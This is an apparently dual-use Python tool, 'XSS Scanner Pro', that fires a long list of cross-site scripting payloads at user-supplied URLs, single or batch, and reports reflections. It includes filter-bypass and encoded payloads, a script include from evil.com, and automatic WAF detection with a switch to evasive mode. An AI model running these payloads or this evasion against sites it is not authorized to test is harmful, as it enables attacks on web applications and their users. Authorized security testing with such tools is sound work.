#!/usr/bin/env python3
# XSS Scanner Pro - Enhanced Version with Advanced Features
# Author: Security Expert
# Version: 3.0

import requests
import sys
import time
import random
import json
import os
import re
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import html
import base64

def clear():
    os.system('clear')

# Interface colorida melhorada
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Banner melhorado com cores
BANNER = f"""
{Colors.BOLD}{Colors.RED}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗              ║
║  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║              ║
║   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║              ║
║   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║              ║
║  ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║              ║
║  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝              ║
║                                                                              ║
║                         X S S   S C A N N E R   P R O                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
"""

# 100+ XSS payloads para teste
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS');\">",
    "<a href=\"javascript:alert('XSS')\">Click</a>",
    "<div onmouseover=\"alert('XSS')\">Hover</div>",
    "<img src=\"javascript:alert('XSS')\">",
    "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
    "<embed src=\"javascript:alert('XSS');\">",
    "<object data=\"javascript:alert('XSS')\">",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
    "<audio src=1 onerror=alert('XSS')>",
    "<video src=1 onerror=alert('XSS')>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit>",
    "<math><brute href=\"javascript:alert('XSS')\">CLICK</brute></math>",
    "<frameset onload=alert('XSS')>",
    "<table background=\"javascript:alert('XSS')\">",
    "';alert(String.fromCharCode(88,83,83))//';",
    "\";alert(String.fromCharCode(88,83,83))//\";",
    "<script>alert(/XSS/.source)</script>",
    "<script>alert(1)</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script src=\"data:text/javascript,alert('XSS')\"></script>",
    "<marquee onstart=alert('XSS')>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    "<style>@import \"javascript:alert('XSS')\";</style>",
    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style>",
    "<span style=\"background-image: url(javascript:alert('XSS'));\">",
    "<span style=\"background-image: url(&#1;javascript:alert('XSS'));\">",
    "<div style=\"width: expression(alert('XSS'));\">",
    "<base href=\"javascript:alert('XSS');//\">",
    "<applet code=\"javascript:alert('XSS');\">",
    "<bgsound src=\"javascript:alert('XSS');\">",
    "<button onfocus=alert('XSS') autofocus>",
    "<keygen autofocus onfocus=alert('XSS')>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS')></select>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<img src=\"x` `<script>alert('XSS')</script>\"` `>",
    "<script>document.write('<script>alert(\"XSS\")</script>');</script>",
    "<script>setTimeout(alert('XSS'),0)</script>",
    "<script>setInterval(alert('XSS'),0)</script>",
    "<script>Function('alert(\"XSS\")')()</script>",
    # Payloads avançados
    "javascript:alert('XSS')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    "javascripT:alert('XSS')",
    "JaVaScRiPt:alert('XSS')",
    "javascript://%0Aalert('XSS')",
    "javascript://%0D%0Aalert('XSS')",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "<img src=x oneonerrorrror=alert('XSS')>",
    "<img src=x: onerror=alert('XSS')>",
    "<img src=x: onerror=alert('XSS')>",
    "<img src=x: onerror=alert('XSS')>",
    # Payloads para bypass de filtros
    "<script>alert`XSS`</script>",
    "<script>(alert)(1)</script>",
    "<script>alert(1)</script>",
    "<script>a=\", alert(1)//\"</script>",
    "<script src=//evil.com/xss.js></script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><script>alert&#40;'XSS'&#41;</script></svg>",
    "<svg><script>alert&lpar;'XSS'&rpar;</script></svg>",
    # Payloads para diferentes contextos
    "\" onfocus=\"alert('XSS')\" autofocus=\"",
    "' onfocus='alert(\"XSS\")' autofocus='",
    " onmouseover=alert('XSS')",
    " onload=alert('XSS')",
    " onerror=alert('XSS')",
    " onscroll=alert('XSS')",
    # Payloads codificados
    "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
    # Payloads para DOM XSS
    "#<script>alert('XSS')</script>",
    "javascript:alert(document.domain)",
    "javascript:alert(window.location)",
    # Payloads específicos para frameworks
    "{{constructor.constructor('alert(1)')()}}",
    "{{alert(1)}}",
    "#{alert(1)}",
    "${{alert(1)}}",
    "<%= alert(1) %>",
    "<? alert(1) ?>",
    "{% alert(1) %}"
]

# Perfis de scan
SCAN_PROFILES = {
    "quick": {"payloads": XSS_PAYLOADS[:15], "timeout": 5, "threads": 10},
    "normal": {"payloads": XSS_PAYLOADS[:40], "timeout": 10, "threads": 20},
    "deep": {"payloads": XSS_PAYLOADS, "timeout": 15, "threads": 30},
    "stealth": {"payloads": [p for p in XSS_PAYLOADS if "alert" not in p], "timeout": 20, "threads": 15}
}

# Configuração
CONFIG = {
    'use_proxy': False,
    'proxy': None,
    'output_file': None,
    'verbose': True,
    'scan_profile': 'normal',
    'threads': 20,
    'timeout': 10,
    'user_agent': 'XSS-Scanner-Pro/3.0',
    'report_format': 'html'
}

def print_status(message, status="info"):
    """Status coloridos para o usuário"""
    colors = {
        "info": Colors.BLUE,
        "success": Colors.GREEN,
        "warning": Colors.YELLOW,
        "error": Colors.RED,
        "vulnerable": Colors.RED + Colors.BOLD
    }
    print(f"{colors.get(status, Colors.WHITE)}▓ {message}{Colors.END}")

def display_menu():
    """Menu principal melhorado"""
    print(f"\n{Colors.BOLD}{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║                         XSS SCANNER PRO MENU                                 ║")
    print("╠══════════════════════════════════════════════════════════════════════════════╣")
    print("║  1. Scan URL for XSS vulnerabilities                                         ║")
    print("║  2. Scan URL with POST method                                                ║")
    print("║  3. Check for stored XSS                                                     ║")
    print("║  4. Batch scan from file                                                     ║")
    print("║  5. Discover parameters automatically                                        ║")
    print("║  6. Configure scan settings                                                  ║")
    print("║  7. List all payloads                                                        ║")
    print("║  8. Generate detailed report                                                 ║")
    print("║  9. Exit                                                                     ║")
    print("╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}")

def configure_settings():
    """Configurações avançadas"""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║                         CONFIGURE SETTINGS                             ║")
    print("╠══════════════════════════════════════════════════════════════════════════════╣{Colors.END}")
    
    # Perfil de scan
    print(f"{Colors.CYAN}Scan Profiles:{Colors.END}")
    for profile, settings in SCAN_PROFILES.items():
        print(f"  {profile}: {len(settings['payloads'])} payloads, {settings['timeout']}s timeout")
    
    profile = input(f"{Colors.WHITE}Select profile (quick/normal/deep/stealth) [{CONFIG['scan_profile']}]: {Colors.END}").strip().lower()
    if profile in SCAN_PROFILES:
        CONFIG['scan_profile'] = profile
        CONFIG.update(SCAN_PROFILES[profile])
    
    # Proxy
    use_proxy = input(f"{Colors.WHITE}Use proxy? (y/n) [{CONFIG['use_proxy']}]: {Colors.END}").strip().lower()
    if use_proxy == 'y':
        proxy_url = input(f"{Colors.WHITE}Enter proxy URL: {Colors.END}").strip()
        CONFIG['use_proxy'] = True
        CONFIG['proxy'] = {'http': proxy_url, 'https': proxy_url}
    else:
        CONFIG['use_proxy'] = False
        CONFIG['proxy'] = None
    
    # Output file
    output_file = input(f"{Colors.WHITE}Output file path (leave empty to disable): {Colors.END}").strip()
    if output_file:
        CONFIG['output_file'] = output_file
    
    # Report format
    report_format = input(f"{Colors.WHITE}Report format (html/json/txt) [{CONFIG['report_format']}]: {Colors.END}").strip().lower()
    if report_format in ['html', 'json', 'txt']:
        CONFIG['report_format'] = report_format
    
    print_status("Settings configured successfully!", "success")

def get_session():
    """Cria sessão HTTP com configurações"""
    session = requests.Session()
    if CONFIG['use_proxy'] and CONFIG['proxy']:
        session.proxies = CONFIG['proxy']
    
    session.headers.update({
        'User-Agent': CONFIG['user_agent'],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    return session

def discover_parameters(url):
    """Descobre automaticamente parâmetros da URL"""
    try:
        session = get_session()
        response = session.get(url, timeout=CONFIG['timeout'])
        soup = BeautifulSoup(response.text, 'html.parser')
        
        params = set()
        
        # Parâmetros da URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        params.update(query_params.keys())
        
        # Forms
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    params.add(input_tag.get('name'))
            
            for select_tag in form.find_all('select'):
                if select_tag.get('name'):
                    params.add(select_tag.get('name'))
        
        # Links com parâmetros
        for link in soup.find_all('a', href=True):
            href = link['href']
            if '?' in href:
                href_params = parse_qs(urlparse(href).query)
                params.update(href_params.keys())
        
        return list(params) if params else ['q', 'search', 'id', 'name', 'email', 'query']
        
    except Exception as e:
        print_status(f"Parameter discovery failed: {e}", "error")
        return ['q', 'search', 'id', 'name', 'email', 'query']  # Fallback

def detect_waf(url):
    """Detecta se há WAF protegendo o alvo"""
    waf_indicators = {
        'cloudflare': ['cloudflare', 'cf-ray'],
        'mod_security': ['mod_security', 'libmodsecurity'],
        'akamai': ['akamai'],
        'imperva': ['imperva', 'incapsula'],
        'aws_waf': ['aws', 'x-amz-id'],
        'sucuri': ['sucuri'],
        'fortinet': ['fortigate', 'fortinet']
    }
    
    try:
        session = get_session()
        response = session.get(url, timeout=CONFIG['timeout'])
        
        server_header = response.headers.get('server', '').lower()
        for waf, indicators in waf_indicators.items():
            if any(indicator in server_header for indicator in indicators):
                return waf
        
        # Verificar cookies e headers específicos
        for header in response.headers:
            header_lower = header.lower()
            header_value = response.headers[header].lower()
            
            for waf, indicators in waf_indicators.items():
                if any(indicator in header_lower or indicator in header_value for indicator in indicators):
                    return waf
        
        return None
        
    except Exception:
        return None

def encode_payload(payload, encoding_type):
    """Aplica encoding para evadir filtros"""
    encodings = {
        "url": lambda p: requests.utils.quote(p),
        "double_url": lambda p: requests.utils.quote(requests.utils.quote(p)),
        "html": lambda p: html.escape(p),
        "unicode": lambda p: ''.join([f'&#{ord(c)};' for c in p]),
        "base64": lambda p: base64.b64encode(p.encode()).decode(),
        "hex": lambda p: ''.join([f'%{ord(c):02x}' for c in p])
    }
    return encodings.get(encoding_type, lambda p: p)(payload)

def check_injection_context(response, payload):
    """Analisa em que contexto o payload foi injetado"""
    contexts = {
        "html_tag": f"<script>{payload}</script>" in response.text,
        "attribute": f"value=\"{payload}\"" in response.text or f"value='{payload}'" in response.text,
        "javascript": f"var test = '{payload}'" in response.text or f'var test = "{payload}"' in response.text,
        "comment": f"<!--{payload}-->" in response.text,
        "url": payload in response.url
    }
    
    return {k: v for k, v in contexts.items() if v}

def generate_html_report(vulnerabilities, target, scan_date):
    """Gera relatório HTML profissional"""
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Scan Report - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }}
        .container {{ background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #333; border-bottom: 2px solid #007acc; padding-bottom: 10px; }}
        .vuln {{ color: #d32f2f; background-color: #ffebee; padding: 10px; border-radius: 5px; margin: 10px 0; }}
        .info {{ color: #1976d2; background-color: #e3f2fd; padding: 10px; border-radius: 5px; margin: 10px 0; }}
        .success {{ color: #388e3c; background-color: #e8f5e8; padding: 10px; border-radius: 5px; margin: 10px 0; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #007acc; color: white; }}
        tr:hover {{ background-color: #f5f5f5; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ XSS Scan Report</h1>
        
        <div class="info">
            <strong>🎯 Target:</strong> {target}<br>
            <strong>📅 Date:</strong> {scan_date}<br>
            <strong>🔍 Scan Profile:</strong> {CONFIG['scan_profile']}
        </div>
        
        <h2>📊 Scan Results</h2>
    """
    
    if vulnerabilities:
        html_content += f"""
        <div class="vuln">
            <strong>❌ Vulnerabilities Found:</strong> {len(vulnerabilities)}
        </div>
        
        <table>
            <tr>
                <th>#</th>
                <th>Parameter</th>
                <th>Payload</th>
                <th>Context</th>
                <th>Risk</th>
            </tr>
        """
        
        for i, vuln in enumerate(vulnerabilities, 1):
            html_content += f"""
            <tr>
                <td>{i}</td>
                <td>{vuln.get('parameter', 'N/A')}</td>
                <td><code>{html.escape(vuln.get('payload', 'N/A'))}</code></td>
                <td>{vuln.get('context', 'N/A')}</td>
                <td>🔥 High</td>
            </tr>
            """
        
        html_content += "</table>"
    else:
        html_content += """
        <div class="success">
            <strong>✅ No vulnerabilities found!</strong><br>
            The target appears to be secure against the tested XSS payloads.
        </div>
        """
    
    html_content += """
        <h2>📈 Statistics</h2>
        <div class="info">
            <strong>Total Payloads Tested:</strong> """ + str(len(SCAN_PROFILES[CONFIG['scan_profile']]['payloads'])) + """<br>
            <strong>Test Duration:</strong> """ + str(round(time.time() - scan_date.timestamp(), 2)) + """ seconds<br>
        </div>
        
        <h2>🛠️ Scan Configuration</h2>
        <div class="info">
            <strong>User Agent:</strong> """ + CONFIG['user_agent'] + """<br>
            <strong>Timeout:</strong> """ + str(CONFIG['timeout']) + """ seconds<br>
            <strong>Threads:</strong> """ + str(CONFIG['threads']) + """<br>
            <strong>Proxy:</strong> """ + ("Enabled" if CONFIG['use_proxy'] else "Disabled") + """<br>
        </div>
        
        <footer style="margin-top: 40px; text-align: center; color: #666;">
            <p>Generated by XSS Scanner Pro v3.0</p>
            <p>⚠️ This report is for authorized security testing only.</p>
        </footer>
    </div>
</body>
</html>
    """
    
    return html_content

def scan_url(url, method='GET', params=None):
    """Escaneia URL para vulnerabilidades XSS"""
    print_status(f"Starting XSS scan on: {url}", "info")
    
    vulnerabilities = []
    session = get_session()
    
    # Detectar WAF
    waf = detect_waf(url)
    if waf:
        print_status(f"WAF detected: {waf.upper()}", "warning")
        if CONFIG['scan_profile'] != 'stealth':
            print_status("Switching to stealth mode for evasion", "info")
            CONFIG['scan_profile'] = 'stealth'
            CONFIG.update(SCAN_PROFILES['stealth'])
    
    # Descobrir parâmetros se não fornecidos
    if not params:
        print_status("Discovering parameters automatically...", "info")
        params = discover_parameters(url)
        print_status(f"Discovered parameters: {params}", "success")
    
    # Executar scan
    payloads = SCAN_PROFILES[CONFIG['scan_profile']]['payloads']
    
    with ThreadPoolExecutor(max_workers=CONFIG['threads']) as executor:
        futures = []
        
        for param in params:
            for payload in payloads:
                futures.append(executor.submit(
                    test_payload, session, url, method, param, payload, params if method == 'POST' else None
                ))
        
        for i, future in enumerate(as_completed(futures), 1):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
                    print_status(f"Vulnerability found! Total: {len(vulnerabilities)}", "vulnerable")
            except Exception as e:
                if CONFIG['verbose']:
                    print_status(f"Error testing payload: {str(e)[:50]}...", "error")
            
            # Progress indicator
            if i % 10 == 0:
                progress = (i / (len(params) * len(payloads))) * 100
                print_status(f"Progress: {progress:.1f}% ({i}/{len(params) * len(payloads)})", "info")
    
    return vulnerabilities

def test_payload(session, url, method, param, payload, post_data=None):
    """Testa um payload específico"""
    try:
        if method == 'GET':
            # Testar em parâmetros GET
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param] = payload
            
            # Reconstruir URL
            new_query = '&'.join([f"{k}={requests.utils.quote(v[0])}" for k, v in query_params.items()])
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            response = session.get(test_url, timeout=CONFIG['timeout'])
        else:
            # Testar em POST data
            data = post_data.copy() if post_data else {}
            data[param] = payload
            response = session.post(url, data=data, timeout=CONFIG['timeout'])
        
        # Verificar se payload foi refletido
        if payload in response.text:
            context = check_injection_context(response, payload)
            return {
                'url': url,
                'parameter': param,
                'payload': payload,
                'context': ', '.join(context.keys()) if context else 'Unknown',
                'method': method
            }
    
    except requests.exceptions.RequestException:
        pass  # Ignorar erros de conexão
    except Exception as e:
        if CONFIG['verbose']:
            print_status(f"Unexpected error: {e}", "error")
    
    return None

def batch_scan(urls_file):
    """Escaneia múltiplos URLs de um arquivo"""
    try:
        with open(urls_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        results = {}
        for url in urls:
            print_status(f"Scanning: {url}", "info")
            results[url] = scan_url(url)
        
        return results
    except Exception as e:
        print_status(f"Batch scan failed: {e}", "error")
        return {}

def main():
    """Função principal"""
    print(BANNER)
    
    # Criar diretório para relatórios
    os.makedirs("reports", exist_ok=True)
    
    while True:
        display_menu()
        try:
            choice = input(f"\n{Colors.WHITE}Select an option (1-9): {Colors.END}").strip()
            
            if choice == "1":
                url = input(f"{Colors.WHITE}Enter URL to scan: {Colors.END}").strip()
                if not url.startswith(('http://', 'https://')):
                    print_status("URL must start with http:// or https://", "error")
                    continue
                
                vulnerabilities = scan_url(url)
                
                # Gerar relatório
                if vulnerabilities:
                    report_content = generate_html_report(vulnerabilities, url, datetime.now())
                    report_file = f"reports/scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                    with open(report_file, 'w') as f:
                        f.write(report_content)
                    print_status(f"Report generated: {report_file}", "success")
            
            elif choice == "2":
                url = input(f"{Colors.WHITE}Enter URL for POST scan: {Colors.END}").strip()
                params_input = input(f"{Colors.WHITE}Enter parameters (param1=value1,param2=value2): {Colors.END}").strip()
                
                param_dict = {}
                if params_input:
                    for pair in params_input.split(','):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            param_dict[key.strip()] = value.strip()
                
                vulnerabilities = scan_url(url, method='POST', params=param_dict)
                
                if vulnerabilities:
                    report_content = generate_html_report(vulnerabilities, url, datetime.now())
                    report_file = f"reports/scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                    with open(report_file, 'w') as f:
                        f.write(report_content)
                    print_status(f"Report generated: {report_file}", "success")
            
            elif choice == "3":
                url = input(f"{Colors.WHITE}Enter URL to check for stored XSS: {Colors.END}").strip()
                print_status("Stored XSS checking not fully implemented yet", "warning")
            
            elif choice == "4":
                urls_file = input(f"{Colors.WHITE}Enter path to URLs file: {Colors.END}").strip()
                if os.path.exists(urls_file):
                    results = batch_scan(urls_file)
                    print_status(f"Batch scan completed. {len(results)} URLs processed.", "success")
                else:
                    print_status("File not found", "error")
            
            elif choice == "5":
                url = input(f"{Colors.WHITE}Enter URL to discover parameters: {Colors.END}").strip()
                params = discover_parameters(url)
                print_status(f"Discovered parameters: {', '.join(params)}", "success")
            
            elif choice == "6":
                configure_settings()
            
            elif choice == "7":
                print(f"\n{Colors.BOLD}{Colors.CYAN}XSS Payloads ({len(XSS_PAYLOADS)} total):{Colors.END}")
                for i, payload in enumerate(XSS_PAYLOADS[:20], 1):  # Mostrar apenas os primeiros 20
                    print(f"{Colors.WHITE}{i:2d}. {payload}{Colors.END}")
                if len(XSS_PAYLOADS) > 20:
                    print(f"{Colors.YELLOW}... and {len(XSS_PAYLOADS) - 20} more payloads{Colors.END}")
            
            elif choice == "8":
                print_status("Use options 1 or 2 to scan first, then generate report", "info")
            
            elif choice == "9":
                print_status("Exiting XSS Scanner Pro. Goodbye!", "success")
                sys.exit(0)
            
            else:
                print_status("Invalid choice. Please select 1-9.", "error")
            
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")
            os.system('clear')
            continue
            
        except KeyboardInterrupt:
            print_status("\nExiting XSS Scanner Pro. Goodbye!", "success")
            sys.exit(0)
        except Exception as e:
            print_status(f"Error: {e}", "error")
            continue

if __name__ == "__main__":
    main()
